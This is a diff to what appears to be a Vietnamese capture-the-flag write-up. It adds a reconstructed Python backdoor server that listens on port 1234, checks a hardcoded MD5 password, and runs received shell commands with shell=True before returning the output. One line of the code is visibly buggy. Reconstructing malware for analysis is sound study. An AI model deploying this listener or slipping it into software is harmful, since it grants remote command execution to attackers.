@@ -329,6 +329,34 @@ while True:
 				client.send(output)
 				client.close()
 ```
+
+* Mình dựng lại server like this:
+```
+import socket
+from hashlib import md5
+from subprocess import check_output
+sock = socket.socket()
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+sock.bind(('0.0.0.0', 1234))
+sock.listen(5)
+while True:
+    while True:
+        client, addr = sock.accept()
+        data = client.recv(32).decode().rstrip("\n")
+
+        if(data != md5(b's4v3_th3_w0rld').hexdigest()):
+            client.sendall('Invalid').encode()
+            client.close()
+        else:
+            command = client.recv(1024)
+            if not command.startswith(b'command:'):
+                client.close()
+            else:
+                command = command.replace(b'command:', b'')
+                output = check_output(command, shell=True)
+                client.send(output)
+                client.close()
+```
 * 
 # 4.Alienware
 
